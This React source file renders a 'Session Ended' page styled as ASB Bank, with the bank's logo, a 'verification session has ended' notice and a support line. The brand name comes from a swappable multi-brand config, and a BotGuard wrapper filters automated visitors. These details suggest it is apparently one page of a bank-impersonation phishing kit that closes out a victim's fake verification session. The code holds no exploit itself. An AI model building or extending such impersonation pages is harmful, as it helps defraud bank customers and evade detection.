'use client';

/**
 * ASB Bank Terminated/Session Ended Page
 * Dark theme centered layout matching ASB design
 */

import { currentBrand } from '@/config/branding';
import { BotGuard } from '@/components/security/BotGuard';
import { AlertTriangle } from 'lucide-react';

export default function TerminatedPage() {
  return (
    <BotGuard>
      {/* ASB Header */}
      <header className="header">
        <div className="header-container">
          <a href="#" className="logo-link">
            <img src="/brands/asb/logo-asb.svg" alt="ASB Logo" className="logo" />
          </a>
        </div>
      </header>

      {/* Main content */}
      <main className="main-content">
        <section className="login-section">
          <div className="login-container">
            <h1 className="page-title">Session Ended</h1>

            <div className="status-container">
              {/* Warning Icon */}
              <div className="status-icon-wrapper warning">
                <AlertTriangle strokeWidth={1.5} />
              </div>

              <p className="status-message-primary">
                Your verification session has ended.
              </p>

              <p className="status-message-secondary">
                This may be due to inactivity or the session was completed.
              </p>

              <p className="status-message-secondary" style={{ marginTop: '24px' }}>
                If you believe this was an error, please contact our support team for assistance.
              </p>

              <p className="status-footer">
                Need help? Contact {currentBrand.companyName} support
              </p>
            </div>
          </div>
        </section>
      </main>
    </BotGuard>
  );
}
